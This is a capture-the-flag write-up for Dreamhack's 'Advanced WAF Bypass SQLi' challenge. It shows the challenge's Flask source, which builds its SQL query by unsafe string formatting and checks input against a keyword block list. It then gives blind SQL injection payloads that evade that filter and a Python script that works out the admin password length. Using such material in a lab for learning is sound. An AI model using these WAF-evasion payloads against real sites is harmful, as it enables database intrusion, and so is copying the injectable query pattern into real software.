---
layout: post
title:  "[Dreamhack]Advanced WAF Bypass SQLI"
date:   2024-05-24 00:29:20 +0700
categories: ctfwriteup
---

### Challenge Name : Advanced WAF Bypass SQLi

Th challenge source code is given below

```
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

This challenge is advanced version of the previous challenge <code>`WAF bypass SQLI`</code>,The user input here is lower casted before checking into the check_WAF function.

At first i tried basic concatenation [OR Operator] and it worked with <code>`'||1=1#` `'||1=0#`</code>

<img>

Then i tried with <code>`'||length(upw)={length}#`</code> , i got success in calculating the length, like if the length is valid,the server will respond the uid but it seems if founded the upw of abcde which is a different user.

Then started struggling with the idea of how to supply the admin uid, meanwhile i understood the exploitation part will require blind injection.

The idea came in to use the [AND operator] && <code>`'||(uid='guest'&&length(upw)=5)#`</code>

It worked and the responded with the uid guest.

<img>

Now we can use concat function to supply admin value in uid <code>`concat('adm','in)`</code>, We also know that the flag value is stored in admin upw and starts with 'D' since the flag format is 'DH{.*}'.

I supplied the payload <code>`'||(uid=concat('adm','in')&&substr(upw,1,1)='D')#` and yesss! we recieved the response uid as admin which means we succceded!

Now our idea is to  find the length of upw and below is the script i created that will help us to find the length!



```
import requests
import urllib.parse

host = "http://host3.dreamhack.games:18985"


length = 0

while True:
	payload = f"'||(uid=concat('adm','in')&&length(upw)={length})#"
	encoded_payload = urllib.parse.quote(payload)

	print(f"Trying length {length}")
	data = requests.get(f"{host}/?uid={encoded_payload}")
	if "admin" in data.text:
		break
	else:
		length=length+1

print(f"Admin upw length is {length}")
```

The length of upw is 44 and now we can bruteforce each character and find the flag.

